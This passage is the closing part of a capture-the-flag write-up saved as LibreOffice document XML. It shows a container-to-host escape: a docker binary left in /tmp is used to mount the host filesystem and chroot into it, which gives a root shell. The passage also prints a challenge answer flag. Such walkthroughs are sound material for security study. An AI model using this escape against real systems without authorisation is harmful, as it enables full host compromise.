            <text:p text:style-name="Preformatted_20_Text">Sudoers file grammar version 46</text:p>
            <text:p text:style-name="Preformatted_20_Text">Sudoers I/O plugin version 1.8.21p2</text:p>
            <text:p text:style-name="Preformatted_20_Text">root@ec96850005d6:~# cd /root</text:p>
            <text:p text:style-name="Preformatted_20_Text">root@ec96850005d6:/root# cat user.txt</text:p>
            <text:p text:style-name="P1">user{edited}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is root.txt?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">root{62ca2110ce7df377872dd9f0797f8476}</text:span> </text:p>
      <text:p text:style-name="Text_20_body"><text:soft-page-break/>Now we must escape from the container to the host.</text:p>
      <text:p text:style-name="Text_20_body">We have the docker binary put in our docker container:</text:p>
      <table:table table:name="Table76" table:style-name="Table76">
        <table:table-column table:style-name="Table76.A"/>
        <table:table-column table:style-name="Table76.B"/>
        <table:table-row table:style-name="TableLine94402689125456">
          <table:table-cell table:style-name="Table76.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="P1">3</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table76.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">root@ec96850005d6:/root# ls -lh /tmp</text:p>
            <text:p text:style-name="Preformatted_20_Text">total 86M</text:p>
            <text:p text:style-name="P1">-rwxr-xr-x 1 root robert 86M Jan 12 16:39 docker</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">We should easily EoP with that:</text:p>
      <table:table table:name="Table77" table:style-name="Table77">
        <table:table-column table:style-name="Table77.A"/>
        <table:table-column table:style-name="Table77.B"/>
        <table:table-row table:style-name="TableLine94402689139968">
          <table:table-cell table:style-name="Table77.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="P1">7</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table77.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">$ gtfoblookup linux shell docker</text:p>
            <text:p text:style-name="Preformatted_20_Text">docker:</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>shell:</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Description: The resulting is a root shell.</text:p>
            <text:p text:style-name="P1"><text:s text:c="8"/>Code: docker run -v /:/mnt --rm -it alpine chroot /mnt sh</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">Let's see the image running:</text:p>
      <table:table table:name="Table78" table:style-name="Table78">
        <table:table-column table:style-name="Table78.A"/>
        <table:table-column table:style-name="Table78.B"/>
        <table:table-row table:style-name="TableLine94402689152368">
          <table:table-cell table:style-name="Table78.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="P1">4</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table78.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">root@ec96850005d6:/root# /tmp/docker ps <text:s text:c="3"/></text:p>
            <text:p text:style-name="Preformatted_20_Text">/tmp/docker ps</text:p>
            <text:p text:style-name="Preformatted_20_Text">CONTAINER ID <text:s text:c="7"/>IMAGE <text:s text:c="14"/>COMMAND <text:s text:c="14"/>CREATED <text:s text:c="12"/>STATUS <text:s text:c="13"/>PORTS <text:s text:c="19"/>NAMES</text:p>
            <text:p text:style-name="P1">ec96850005d6 <text:s text:c="7"/>mangoman <text:s text:c="11"/>"/usr/sbin/sshd -D" <text:s text:c="2"/>3 weeks ago <text:s text:c="8"/>Up 2 hours <text:s text:c="9"/>127.0.0.1:2222-&gt;22/tcp <text:s text:c="2"/>kronstadt_industrie</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">Let's exploit that from docker container root to docker host root:</text:p>
      <table:table table:name="Table79" table:style-name="Table79">
        <table:table-column table:style-name="Table79.A"/>
        <table:table-column table:style-name="Table79.B"/>
        <table:table-row table:style-name="TableLine94402689177456">
          <table:table-cell table:style-name="Table79.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="P1">6</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table79.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">root@ec96850005d6:/root# /tmp/docker run -v /:/mnt --rm -it mangoman chroot /mnt sh</text:p>
            <text:p text:style-name="Preformatted_20_Text"><text:s/>shp/docker run -v /:/mnt --rm -it mangoman chroot /mnt </text:p>
            <text:p text:style-name="Preformatted_20_Text"># id</text:p>
            <text:p text:style-name="Preformatted_20_Text">uid=0(root) gid=0(root) groups=0(root)</text:p>
            <text:p text:style-name="Preformatted_20_Text"># cat /root/root.txt</text:p>
            <text:p text:style-name="P1">root{edited}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>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Bitstream Vera Sans" style:font-family-asian="'Bitstream Vera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22T00:37:15.178888226</meta:creation-date>
    <dc:date>2021-10-22T00:39:13.838109437</dc:date>
    <meta:editing-duration>PT2M</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="79" meta:image-count="0" meta:object-count="0" meta:page-count="18" meta:paragraph-count="1304" meta:word-count="4288" meta:character-count="35497" meta:non-whitespace-character-count="31257"/>
    <meta:generator>LibreOffice/7.2.1.2$Linux_X86_64 LibreOffice_project/20$Build-2</meta:generator>
  </office:meta>
</office:document-meta>
</file>